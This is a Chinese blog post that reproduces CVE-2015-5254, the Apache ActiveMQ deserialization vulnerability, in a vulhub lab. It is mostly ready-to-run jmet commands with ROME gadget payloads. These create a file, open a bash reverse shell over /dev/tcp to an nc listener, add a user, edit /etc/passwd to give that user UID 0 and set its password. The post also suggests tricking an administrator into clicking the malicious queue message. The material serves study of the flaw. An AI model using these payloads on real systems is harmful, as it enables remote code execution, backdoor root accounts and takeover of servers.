# CVE-2015-5254 ActiveMQ 反序列化漏洞 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15621744.html`](https://www.cnblogs.com/peace-and-romance/p/15621744.html)

### 0X00-引言

* * *

听闻广陵不知寒，大雪龙骑下江南。总管的书没话说，好的不行，骗得了几滴热泪，也读得了几分仁义道德，技术活，当赏！

### 0X01-漏洞描述与环境搭建

* * *

##### 01-漏洞描述

漏洞编号：CVE-2015-5254

Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持 Java 消息服务，集群，Spring Framework 等。Apache ActiveMQ 5.13.0 之前 5.x 版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的 Java 消息服务（JMS）ObjectMessage 对象利用该漏洞执行任意代码。

##### 02-环境搭建

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

环境运行后，将监听 61616 和 8161 两个端口其中 61616 是工作端口，消息在这个端口进行传递; 8161 是网络管理页面端口访问 http://your-ip:8161 即可看到网络管理页面，不过这个漏洞理论上是不需要网络的。

使用浏览器直接访问 activemq，查看是否部署完毕

[`192.168.234.128:8161/admin/`](http://192.168.234.128:8161/admin/) (默认账号密码 admin/admin)

![image-20211129104252697](img/a1334a016f89c14bec4602816e21cea2.png)

### 0X02-漏洞复现

* * *

##### 01-利用过程

**利用流程：**

1.  构造（可以使用 ysoserial）可执行命令的序列化对象
2.  作为一个消息，发送给目标 61616 端口
3.  访问的 Web 管理页面，读取消息，触发漏洞

**jmet 进行漏洞利用：**

首先下载 jmet 的 jar 文件，并在同目录下创建一个 external 文件夹（否则可能会爆文件夹不存在的错误）。jmet 原理是使用 ysoserial 生成 Payload 并发送（其 jar 内自带 ysoserial，无需再自己下载），所以我们需要在 ysoserial 是 gadget 中选择一个可以使用的，比如 ROME。

jmet 的 GitHub 地址：

```
https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar 
```

##### 02-创建 tmp/success

使用 jmet 进行攻击

执行命令

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/sucess" -Yp ROME 192.168.234.128 61616 
```

执行命令之后会给目标添加一个事件的队列，查看队列

[`192.168.234.128:8161/admin/browse.jsp?JMSDestination=event`](http://192.168.234.128:8161/admin/browse.jsp?JMSDestination=event)

![image-20211129105611566](img/675b2078594eb0e638c1a0f3013daff5.png)

点击 ID 触发命令执行

![image-20211129105709311](img/f18d7742865074f1ae5194f51342d8b0.png)

进入靶机 docker 中查看命令执行是否成功

```
docker exec -it  e8cb4850afc6  /bin/bash 
```

![image-20211129110147732](img/c8725432564ac1da360dfe505ac2a5d0.png)

创建成功

![image-20211129110315988](img/cf315ed9bf86084d34bce59ecab49a8c.png)

退出 docker 命令 exit

![image-20211129110437900](img/fc2ce3336ff2a472310a19d3095b2a14.png)

##### 03-反弹 shell

直接执行命令没有反弹成功

需要将反弹 shell 的代码反序列化

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -i >& /dev/tcp/192.168.234.128/1234  0>&1" -Yp ROME 192.168.234.128  61616 
```

加密网址：[`www.jackson-t.ca/runtime-exec-payloads.html`](http://www.jackson-t.ca/runtime-exec-payloads.html)

![image-20211129144933561](img/75ef5d9d2351f44ed2c2318c1fa07075.png)

**NetCat 安装**：

```
yum -y install nmap-ncat  #安装
nc -version  #查看版本 
```

nc 监听反弹 shell

```
nc -lvvp 1234 
```

开启监听后点击队列消息，点击之后再返回页面可以把队列删除，反弹的 shell 依然存在

![image-20211129145347280](img/c515942fc47d6f1b305af9586632cce5.png)

**成功**![image-20211129145537344](img/7eca8816e6e093094c2b2267380c8527.png)

值得注意的是，通过 web 管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。

##### 04-添加用户

执行命令在 root 组内添加 test 用户

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "useradd -g root -s /bin/bash -u 10010 test" -Yp ROME  192.168.234.128  61616 
```

点击事件队列 http://192.168.234.128:8161/admin/browse.jsp?JMSDestination=event

可以在/etc/passwd 中查看到 test 用户![image-20211129150900630](img/d0fc1f66eb936d930280fad97d9fe8b8.png)

将 passwd 中的 test 的 uid 修改为 0，使它拥有 root 权限，再点击一下事件队列

```
 java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "sed -i "s/test:x:10010/test:x:0/g" /etc/passwd" -Yp ROME  192.168.234.128  61616 
```

修改成功

![image-20211129151303420](img/c60d4d59a5805c79b23b99b9514b3569.png)

再为 test 用户设置一个密码，再点击一次消息队列

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "echo "test:sd123456" | chpasswd" -Yp ROME   192.168.234.128  61616 
```

各位，在这里，一个名为 test，密码为 123456，权限为 root 的用户已经生成，用 SSH 登录系统，为 root 权限，注意此用户为 docker 容器内的用户，与 CentOS Linux 7 无关，所以连接不上😁

### 0X03-参考文献

* * *

[[ActiveMQ 反序列化漏洞（CVE-2015-5254）复现]](https://www.cnblogs.com/backlion/p/9970516.html)

[ActiveMQ 反序列化漏洞（CVE-2015-5254）](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md)

[【CVE】CVE-2015-5254：ActiveMQ 反序列化漏洞利用](https://blog.csdn.net/qq_43427482/article/details/114828216?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2.no_search_link)